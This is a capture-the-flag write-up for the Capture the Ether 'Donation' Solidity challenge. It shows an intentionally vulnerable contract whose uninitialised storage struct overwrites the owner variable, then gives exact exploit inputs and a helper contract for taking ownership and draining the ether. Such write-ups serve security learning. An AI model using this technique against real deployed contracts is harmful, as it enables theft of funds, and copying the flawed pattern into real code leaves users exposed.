# Donation

## Challenge
Source: https://capturetheether.com/challenges/math/donation/
>A  candidate you don’t like is accepting campaign contributions via the smart contract below.
>
>To complete this challenge, steal the candidate’s ether.
```
pragma solidity ^0.4.21;

contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function DonationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}
```

## Solution

Remember to be aware of the order in which variables are declared. This puzzle is exploitable for that exact reason. The dynamic ```Donation``` struct array ```donations``` has created a situation in which the ```owner``` address variable is over-written by every ```etherAmount``` uint256 argument in a ```donate``` function call. According to the [Solidity docs](https://solidity.readthedocs.io/en/v0.4.20/miscellaneous.html#layout-of-state-variables-in-storage): Structs and array data always start a new slot and occupy whole slots. So in this case, the dynamic array's length is stored in slot ```0x0```. Then slot ```0x1``` is reserved for ```address public owner```. More info on how the EVM treats structs can be found here: https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7

The solution to this puzzle involves the following steps..

To determine the appropriate ```msg.value```, take your 20 byte Ethereum address (fake example):
```
"0x91FA000000000000000000000000000000000000"
```

Pass it as an argument in the Solidity function below to determine the ```msg.value``` to the puzzle's ```donate``` function call. The return value is denominated in wei:
```
pragma solidity ^0.4.21;

contract etherAmount {
    function addressToNumber(bytes20 _address) public view returns (uint256) {
        return uint256(_address) / (10**18 * 1 ether);
    }
}
```
Using the address ```"0x91FA000000000000000000000000000000000000"```, the above contract would return:
```
833378848069 wei
```

To solve using the above example values... pass these two in the puzzle's ```donate``` function call.
*etherAmount:
```
"0x91FA000000000000000000000000000000000000"
```
msg.value:
```
833378848069 wei
```
The ```owner``` variable has been set to ```etherAmount```. Call the ```withdraw``` function to retrieve the ```1 ether``` and ```833378848069 wei``` to pass the challenge.
